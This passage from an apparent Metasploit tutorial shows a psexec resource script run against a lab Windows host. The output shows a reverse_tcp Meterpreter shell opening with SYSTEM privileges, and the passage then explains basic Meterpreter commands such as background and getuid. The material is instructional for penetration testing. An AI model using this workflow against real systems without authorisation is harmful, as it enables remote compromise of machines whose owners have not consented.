4. To run a resource script when launching msfconsole, use the -r option followed by the path to the resource script:

```
root@kali:~# msfconsole -q -r psexec.rc
...
[*] 192.168.216.10:445 - Selecting PowerShell target
[*] 192.168.216.10:445 - Executing the payload...
[+] 192.168.216.10:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (179267 bytes) to 192.168.216.10
[*] Meterpreter session 1 opened (192.168.216.5:4444 -> 192.168.216.10:49292) at 2017-10-30 07:42:23 -0400

meterpreter >
```

5. After compromising the target machine, we will have a Meterpreter session started, since we have used the windows/meterpreter/reverse_tcp payload. We will start off by using a simple ? command, which will list all the available Meterpreter commands, along with a short description:

```
meterpreter > ?
```

6. Let's start with some useful system commands:

+   - background: This command is used to set the current session as the background so that it can be used again when needed. This command is useful when there are multiple active Meterpreter sessions.
+   - getuid: This command returns the username that is running or the one which we broke into, on the target machine:

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```